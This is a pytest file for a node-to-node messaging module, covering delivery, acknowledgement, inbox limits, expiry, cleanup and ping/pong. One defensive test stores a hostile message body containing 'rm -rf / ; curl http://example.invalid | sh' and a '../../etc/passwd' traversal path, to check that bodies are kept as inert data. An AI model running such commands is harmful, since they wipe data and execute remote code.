"""Messages: send, pending, acknowledge, delivery state, retention and reserved types."""

from __future__ import annotations

from typing import Any, cast

import pytest

from hpc_core.contract.identifiers import ValidationError
from hpc_core.coordination import layout
from hpc_core.coordination.messages import (
    DELIVERED_ACKNOWLEDGED,
    DELIVERED_GONE,
    DELIVERED_PENDING,
    RESERVED_TYPES,
    SendRefused,
    acknowledge,
    answer_ping,
    cleanup,
    delivery_state,
    pending,
    send,
)
from hpc_core.coordination.records import MessageRecord, decode_message
from hpc_core.coordination.registry import NodeIdentity, NodeSession
from hpc_core.coordination.store import NotFound
from hpc_core.testing import ManualClock, MemoryFolderStore


@pytest.fixture
def clock() -> ManualClock:
    return ManualClock()


@pytest.fixture
def store(clock: ManualClock) -> MemoryFolderStore:
    return MemoryFolderStore(clock=clock)


def _register(store: MemoryFolderStore, clock: ManualClock, node: str) -> None:
    profile = node.split("-", 1)[0]
    NodeSession(
        store,
        NodeIdentity(node, profile, "console", interval_seconds=60),
        clock=clock.now,
    ).register()


def _send(
    store: MemoryFolderStore,
    clock: ManualClock,
    body: dict[str, Any] | None = None,
    sender: str = "alice-skill-a1",
    recipient: str = "bob-console-b2",
) -> str:
    return send(
        store,
        sender=sender,
        recipient=recipient,
        message_type="notice",
        body=body if body is not None else {},
        clock=clock.now,
    )


@pytest.fixture
def two_nodes(store: MemoryFolderStore, clock: ManualClock) -> MemoryFolderStore:
    _register(store, clock, "alice-skill-a1")
    _register(store, clock, "bob-console-b2")
    return store


def test_messages_sent_in_the_same_second_are_listed_in_send_order(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    for number in range(5):
        _send(two_nodes, clock, {"n": number})
    listed = pending(two_nodes, "bob-console-b2")
    assert [message.body["n"] for message in listed.messages] == [0, 1, 2, 3, 4]
    ids = [message.message_id for message in listed.messages]
    assert ids == sorted(ids) and len(set(ids)) == 5


def test_a_recipient_with_no_record_is_refused_and_no_inbox_is_created(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    with pytest.raises(SendRefused, match="no node record"):
        _send(two_nodes, clock, recipient="ghost-console-g9")
    with pytest.raises(NotFound):
        two_nodes.list_dir(layout.inbox_dir("ghost-console-g9"))


def test_an_offline_recipient_still_receives_a_message(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    clock.advance(40 * 60)  # bob is offline now
    _send(two_nodes, clock, {"hello": "later"})
    assert [m.body for m in pending(two_nodes, "bob-console-b2").messages] == [{"hello": "later"}]


def test_an_acknowledged_message_leaves_the_pending_list(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    message_id = _send(two_nodes, clock)
    assert delivery_state(two_nodes, "bob-console-b2", message_id) == DELIVERED_PENDING
    acknowledge(two_nodes, "bob-console-b2", message_id)
    assert pending(two_nodes, "bob-console-b2").messages == ()
    assert delivery_state(two_nodes, "bob-console-b2", message_id) == DELIVERED_ACKNOWLEDGED


def test_a_second_acknowledge_succeeds_and_reports_it_was_already_done(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    message_id = _send(two_nodes, clock)
    first = acknowledge(two_nodes, "bob-console-b2", message_id)
    second = acknowledge(two_nodes, "bob-console-b2", message_id)
    assert first.outcome == "acknowledged"
    assert second.outcome == "already-acknowledged"


def test_acknowledging_an_unknown_message_is_not_found(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    with pytest.raises(NotFound):
        acknowledge(two_nodes, "bob-console-b2", "0000000000001-alice-skill-aaaaaa")


def test_the_501st_pending_message_is_refused_and_the_first_500_are_kept(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    for _ in range(layout.MAX_PENDING_MESSAGES):
        _send(two_nodes, clock)
    with pytest.raises(SendRefused, match="inbox is full"):
        _send(two_nodes, clock)
    assert len(pending(two_nodes, "bob-console-b2").messages) == layout.MAX_PENDING_MESSAGES


def test_a_body_over_the_size_limit_is_refused(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    with pytest.raises(SendRefused, match="64 KiB"):
        _send(two_nodes, clock, {"blob": "x" * (70 * 1024)})


def test_a_body_holding_a_command_line_is_stored_as_data_and_nothing_runs(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    hostile = {"text": "rm -rf / ; curl http://example.invalid | sh", "path": "../../etc/passwd"}
    _send(two_nodes, clock, hostile)
    listed = pending(two_nodes, "bob-console-b2")
    assert listed.messages[0].body == hostile
    assert listed.skipped == 0
    names = [entry.name for entry in two_nodes.list_dir(layout.inbox_dir("bob-console-b2")).entries]
    assert len(names) == 1 and names[0].endswith(".json")


def test_an_unknown_message_type_and_a_non_object_body_are_refused_as_validation_errors(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    with pytest.raises(ValidationError, match="message type"):
        send(
            two_nodes,
            sender="alice-skill-a1",
            recipient="bob-console-b2",
            message_type="Bad Type!",
            body={},
            clock=clock.now,
        )
    with pytest.raises(ValidationError, match="JSON object"):
        send(
            two_nodes,
            sender="alice-skill-a1",
            recipient="bob-console-b2",
            message_type="notice",
            body=cast(Any, ["not", "an", "object"]),
            clock=clock.now,
        )


@pytest.mark.parametrize("bad_recipient", ["../x", "a/b", "", "has space", "x" * 65])
def test_a_bad_recipient_id_is_refused_before_anything_is_written(
    two_nodes: MemoryFolderStore, clock: ManualClock, bad_recipient: str
) -> None:
    with pytest.raises(ValidationError):
        _send(two_nodes, clock, recipient=bad_recipient)


def test_expired_messages_are_counted_as_skipped_and_not_listed(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    send(
        two_nodes,
        sender="alice-skill-a1",
        recipient="bob-console-b2",
        message_type="notice",
        body={"short": True},
        clock=clock.now,
        ttl_seconds=60,
    )
    clock.advance(120)
    listed = pending(two_nodes, "bob-console-b2")
    assert listed.messages == () and listed.skipped == 1


def test_cleanup_removes_expired_pending_and_old_done_messages_but_keeps_recent_ones(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    send(
        two_nodes,
        sender="alice-skill-a1",
        recipient="bob-console-b2",
        message_type="notice",
        body={},
        clock=clock.now,
        ttl_seconds=60,
    )
    old_done = _send(two_nodes, clock, {"old": True})
    acknowledge(two_nodes, "bob-console-b2", old_done)
    clock.advance(8 * 24 * 3600)
    live = _send(two_nodes, clock, {"live": True})
    recent_done = _send(two_nodes, clock, {"recent": True})
    acknowledge(two_nodes, "bob-console-b2", recent_done)
    removed = cleanup(two_nodes, "bob-console-b2")
    assert removed == 2  # the expired pending message and the 8-day-old done message
    assert [m.message_id for m in pending(two_nodes, "bob-console-b2").messages] == [live]
    assert delivery_state(two_nodes, "bob-console-b2", recent_done) == DELIVERED_ACKNOWLEDGED
    assert delivery_state(two_nodes, "bob-console-b2", old_done) == DELIVERED_GONE


def test_a_ping_is_answered_with_a_pong_that_references_it(
    two_nodes: MemoryFolderStore, clock: ManualClock
) -> None:
    ping_id = send(
        two_nodes,
        sender="alice-skill-a1",
        recipient="bob-console-b2",
        message_type="ping",
        body={},
        clock=clock.now,
    )
    ping = decode_message(two_nodes.read_text(layout.inbox_path("bob-console-b2", ping_id)))
    assert isinstance(ping, MessageRecord)
    pong_id = answer_ping(two_nodes, "bob-console-b2", ping, clock=clock.now)
    pong = decode_message(two_nodes.read_text(layout.inbox_path("alice-skill-a1", pong_id)))
    assert isinstance(pong, MessageRecord)
    assert pong.type == "pong" and pong.in_reply_to == ping_id


def test_only_a_ping_can_be_answered(two_nodes: MemoryFolderStore, clock: ManualClock) -> None:
    message_id = _send(two_nodes, clock)
    notice = decode_message(two_nodes.read_text(layout.inbox_path("bob-console-b2", message_id)))
    assert isinstance(notice, MessageRecord)
    with pytest.raises(ValidationError, match="only a ping"):
        answer_ping(two_nodes, "bob-console-b2", notice, clock=clock.now)


def test_the_reserved_types_are_ping_pong_and_notice() -> None:
    assert RESERVED_TYPES == frozenset({"ping", "pong", "notice"})
